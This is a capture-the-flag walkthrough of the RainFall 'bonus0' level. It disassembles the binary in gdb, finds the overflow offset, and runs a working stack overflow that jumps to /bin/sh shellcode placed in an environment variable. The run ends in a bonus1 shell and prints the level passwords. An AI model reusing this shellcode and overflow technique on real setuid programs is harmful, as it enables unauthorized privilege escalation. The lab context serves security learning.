level9@RainFall:~$ su bonus0
Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
bonus0@RainFall:~$

bonus0@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus1 users 5566 Mar  6  2016 bonus0

bonus0@RainFall:~$ ./bonus0
 -
a
 -
a
a a

********************************************************************************
There is two inputs to give.
********************************************************************************

(gdb) info function
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  read
0x08048380  read@plt
0x08048390  strcat
0x08048390  strcat@plt
0x080483a0  strcpy
0x080483a0  strcpy@plt
0x080483b0  puts
0x080483b0  puts@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  strchr
0x080483d0  strchr@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  strncpy
0x080483f0  strncpy@plt
0x08048400  _start
0x08048430  __do_global_dtors_aux
0x08048490  frame_dummy
0x080484b4  p
0x0804851e  pp
0x080485a4  main
0x080485d0  __libc_csu_init
0x08048640  __libc_csu_fini
0x08048642  __i686.get_pc_thunk.bx
0x08048650  __do_global_ctors_aux
0x0804867c  _fini

********************************************************************************
A call to strcpy might permit us to overwrite somewhere.
********************************************************************************

(gdb) disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:	push   %ebp
   0x080485a5 <+1>:	mov    %esp,%ebp
   0x080485a7 <+3>:	and    $0xfffffff0,%esp
   0x080485aa <+6>:	sub    $0x40,%esp
   0x080485ad <+9>:	lea    0x16(%esp),%eax
   0x080485b1 <+13>:	mov    %eax,(%esp)
   0x080485b4 <+16>:	call   0x804851e <pp>
   0x080485b9 <+21>:	lea    0x16(%esp),%eax
   0x080485bd <+25>:	mov    %eax,(%esp)
   0x080485c0 <+28>:	call   0x80483b0 <puts@plt>
   0x080485c5 <+33>:	mov    $0x0,%eax
   0x080485ca <+38>:	leave
   0x080485cb <+39>:	ret
End of assembler dump.

********************************************************************************
The main call pp and puts the buffer we fill with pp.
********************************************************************************

(gdb) disas pp
Dump of assembler code for function pp:
   0x0804851e <+0>:	push   %ebp
   0x0804851f <+1>:	mov    %esp,%ebp
   0x08048521 <+3>:	push   %edi
   0x08048522 <+4>:	push   %ebx
   0x08048523 <+5>:	sub    $0x50,%esp
   0x08048526 <+8>:	movl   $0x80486a0,0x4(%esp)
   0x0804852e <+16>:	lea    -0x30(%ebp),%eax
   0x08048531 <+19>:	mov    %eax,(%esp)
   0x08048534 <+22>:	call   0x80484b4 <p>
   0x08048539 <+27>:	movl   $0x80486a0,0x4(%esp)
   0x08048541 <+35>:	lea    -0x1c(%ebp),%eax
   0x08048544 <+38>:	mov    %eax,(%esp)
   0x08048547 <+41>:	call   0x80484b4 <p>
   0x0804854c <+46>:	lea    -0x30(%ebp),%eax
   0x0804854f <+49>:	mov    %eax,0x4(%esp)
   0x08048553 <+53>:	mov    0x8(%ebp),%eax
   0x08048556 <+56>:	mov    %eax,(%esp)
   0x08048559 <+59>:	call   0x80483a0 <strcpy@plt>
   0x0804855e <+64>:	mov    $0x80486a4,%ebx
   0x08048563 <+69>:	mov    0x8(%ebp),%eax
   0x08048566 <+72>:	movl   $0xffffffff,-0x3c(%ebp)
   0x0804856d <+79>:	mov    %eax,%edx
   0x0804856f <+81>:	mov    $0x0,%eax
   0x08048574 <+86>:	mov    -0x3c(%ebp),%ecx
   0x08048577 <+89>:	mov    %edx,%edi
   0x08048579 <+91>:	repnz scas %es:(%edi),%al
   0x0804857b <+93>:	mov    %ecx,%eax
   0x0804857d <+95>:	not    %eax
   0x0804857f <+97>:	sub    $0x1,%eax
   0x08048582 <+100>:	add    0x8(%ebp),%eax
   0x08048585 <+103>:	movzwl (%ebx),%edx
   0x08048588 <+106>:	mov    %dx,(%eax)
   0x0804858b <+109>:	lea    -0x1c(%ebp),%eax
   0x0804858e <+112>:	mov    %eax,0x4(%esp)
   0x08048592 <+116>:	mov    0x8(%ebp),%eax
   0x08048595 <+119>:	mov    %eax,(%esp)
   0x08048598 <+122>:	call   0x8048390 <strcat@plt>
   0x0804859d <+127>:	add    $0x50,%esp
   0x080485a0 <+130>:	pop    %ebx
   0x080485a1 <+131>:	pop    %edi
   0x080485a2 <+132>:	pop    %ebp
   0x080485a3 <+133>:	ret
End of assembler dump.

********************************************************************************
the function pp calls p two times, strcpy and strcat and seems to do a strlen too.
we will use the strcpy or tyhe strcat to use a buffer overflow attack.
********************************************************************************

(gdb) disas p
Dump of assembler code for function p:
   0x080484b4 <+0>:	push   %ebp
   0x080484b5 <+1>:	mov    %esp,%ebp
   0x080484b7 <+3>:	sub    $0x1018,%esp
   0x080484bd <+9>:	mov    0xc(%ebp),%eax
   0x080484c0 <+12>:	mov    %eax,(%esp)
   0x080484c3 <+15>:	call   0x80483b0 <puts@plt>
   0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)
   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
   0x080484da <+38>:	movl   $0x0,(%esp)
   0x080484e1 <+45>:	call   0x8048380 <read@plt>
   0x080484e6 <+50>:	movl   $0xa,0x4(%esp)
   0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
   0x080484f4 <+64>:	mov    %eax,(%esp)
   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>
   0x080484fc <+72>:	movb   $0x0,(%eax)
   0x080484ff <+75>:	lea    -0x1008(%ebp),%eax
   0x08048505 <+81>:	movl   $0x14,0x8(%esp)
   0x0804850d <+89>:	mov    %eax,0x4(%esp)
   0x08048511 <+93>:	mov    0x8(%ebp),%eax
   0x08048514 <+96>:	mov    %eax,(%esp)
   0x08048517 <+99>:	call   0x80483f0 <strncpy@plt>
   0x0804851c <+104>:	leave
   0x0804851d <+105>:	ret
End of assembler dump.

********************************************************************************
p read our input with a buffer of 4096o, and copy the 20 first charachter we
input in a buffer and return it. We can use the vulnerability of strncpy to send
a buffer without '\0' to strcpy in pp.
********************************************************************************

bonus0@RainFall:~$ gdb bonus0
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
 -

AAAABBBBCCCCDDDDEEEE
[Inferior 1 (process 3555) exited normally]
(gdb) step
The program is not being run.
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -

 -
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
 AAAABBBBCCCCDDDDEEEE��
[Inferior 1 (process 3558) exited normally]
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
a
 -
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
a AAAABBBBCCCCDDDDEEEE��
[Inferior 1 (process 3559) exited normally]
(gdb) run
Starting program: /home/user/bonus0/bonus0
 -
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
 -
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
AAAABBBBCCCCDDDDEEEEAAAABBBBCCCCDDDDEEEE�� AAAABBBBCCCCDDDDEEEE��

Program received signal SIGSEGV, Segmentation fault.
0x44434343 in ?? ()
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/bonus0/bonus0
 -
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
 -
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
AAAABBBBCCCCDDDDEEEEaaaabbbbccccddddeeee�� aaaabbbbccccddddeeee��

Program received signal SIGSEGV, Segmentation fault.
0x64636363 in ?? ()
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/bonus0/bonus0
 -
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
 -
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
aaaabbbbccccddddeeeeAAAABBBBCCCCDDDDEEEE�� AAAABBBBCCCCDDDDEEEE��

Program received signal SIGSEGV, Segmentation fault.
0x44434343 in ?? ()

********************************************************************************
We found the offset at 9 on the second read.
********************************************************************************

(gdb) si
0x08048598 in pp ()
(gdb) i r
eax            0xbffff9c6	-1073743418
ecx            0xffffffd2	-46
edx            0x20	32
ebx            0x80486a4	134514340
esp            0xbffff950	0xbffff950
ebp            0xbffff9a8	0xbffff9a8
esi            0x0	0
edi            0xbffff9f3	-1073743373
eip            0x8048598	0x8048598 <pp+122>
eflags         0x200292	[ AF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x /50xw 0xbffff9c6
0xbffff9c6:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff9d6:	0x42424242	0x41414141	0x41414141	0xfffbe141
0xbffff9e6:	0x414141bf	0x41414141	0xb7fd0ff4	0x00000020
0xbffff9f6:	0x00000000	0x54d30000	0x0001b7e4	0xfa940000
0xbffffa06:	0xfa9cbfff	0xc858bfff	0x0000b7fd	0xfa1c0000
0xbffffa16:	0xfa9cbfff	0x0000bfff	0x824c0000	0x0ff40804
0xbffffa26:	0x0000b7fd	0x00000000	0x00000000	0xbe9a0000
0xbffffa36:	0x9a8af152	0x0000c60f	0x00000000	0x00000000
0xbffffa46:	0x00010000	0x84000000	0x00000804	0x26b00000
0xbffffa56:	0x53e9b7ff	0xeff4b7e4	0x0001b7ff	0x84000000
0xbffffa66:	0x00000804	0x84210000	0x85a40804	0x00010804
0xbffffa76:	0xfa940000	0x85d0bfff	0x86400804	0xd2800804
0xbffffa86:	0xfa8cb7fe	0xf918bfff
(gdb) x /50xw $ebp-60
0xbffff96c:	0xffffffff	0xbffff9af	0xbffff9ae	0x42424242
0xbffff97c:	0x42424242	0x42424242	0x42424242	0x42424242
0xbffff98c:	0x41414141	0x41414141	0xfffbe141	0x414141bf
0xbffff99c:	0x41414141	0xb7fd0ff4	0x00000000	0xbffff9f8
0xbffff9ac:	0x080485b9	0xbffff9c6	0x080498d8	0x00000001
0xbffff9bc:	0x0804835d	0xb7fd13e4	0x42420016	0x42424242
0xbffff9cc:	0x42424242	0x42424242	0x42424242	0x41414242
0xbffff9dc:	0x41414141	0xe1414141	0x41bffffb	0x41414141
0xbffff9ec:	0x0ff44141	0x0020b7fd	0x00000000	0x00000000
0xbffff9fc:	0xb7e454d3	0x00000001	0xbffffa94	0xbffffa9c
0xbffffa0c:	0xb7fdc858	0x00000000	0xbffffa1c	0xbffffa9c
0xbffffa1c:	0x00000000	0x0804824c	0xb7fd0ff4	0x00000000
0xbffffa2c:	0x00000000	0x00000000
...
(gdb) si
0x080485cb in main ()
(gdb) si
Cannot access memory at address 0x41414145

********************************************************************************
We can see that strcpy didn't found a '\0' and copied our two buffer + some other
character before finding a 0 so in the strcat the overflow will happen, our buffer
being only 54. We see that we have overwriten the address of the return of the main.
********************************************************************************

bonus0@RainFall:~$ python -c "print('\x90'*1000+'\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')" > /tmp/payload

*********************************************************************************
We will do a ret to libc attack, to do this we need to put our shellcode in an
environment variable, and put an address pointing to a nop's area of our
shellcode at the end of our buffer overflow.
We will now check where if our environment variable is in the memory.
*******************************************************************************

bonus0@RainFall:~$ env -i payload=$(cat /tmp/payload) gdb ./bonus0
(gdb) b *main+13
Breakpoint 1 at 0x80485b1
(gdb) run
Starting program: /home/user/bonus0/bonus0

Breakpoint 1, 0x080485b1 in main ()
(gdb) x /200xs environ
...
0xbffffb91:	 "payload=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\...
...

(gdb) x /200xw 0xbffffb91
0xbffffb91:	0x6c796170	0x3d64616f	0x90909090	0x90909090
0xbffffba1:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbb1:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbc1:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbd1:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbe1:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbf1:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc01:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc11:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc21:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc31:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc41:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc51:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc61:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc71:	0x90909090	0x90909090	0x90909090	0x90909090
...

********************************************************************************
We found the nop's area, we take a random address of a nop like 0xbffffbe1.
********************************************************************************

bonus0@RainFall:~$ python -c "print('A'*4095+'\n'+'A'*9+'\xe1\xfb\xff\xbf')" > /tmp/exploit


********************************************************************************
We construct our buffer overflow with the nop's address at the good offset.
We need to put 4095 charachters and a '\n', like this we can send all the exploit
in one time, even if there is two read.
********************************************************************************

bonus0@RainFall:~$ python -c "print('B'*4095+'\n'+'A'*9+'\xe1\xfb\xff\xbf'+'A'*100)" > /tmp/exploit
bonus0@RainFall:~$ cat /tmp/exploit - | env -i payload=$(cat /tmp/payload) ./bonus0
 -
 -
BBBBBBBBBBBBBBBBBBBBAAAAAAAAA����AAAAAAA�� AAAAAAAAA����AAAAAAA��
$ whoami

$ whoami
bonus1
$ cd ../bonus1
$ cat .pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9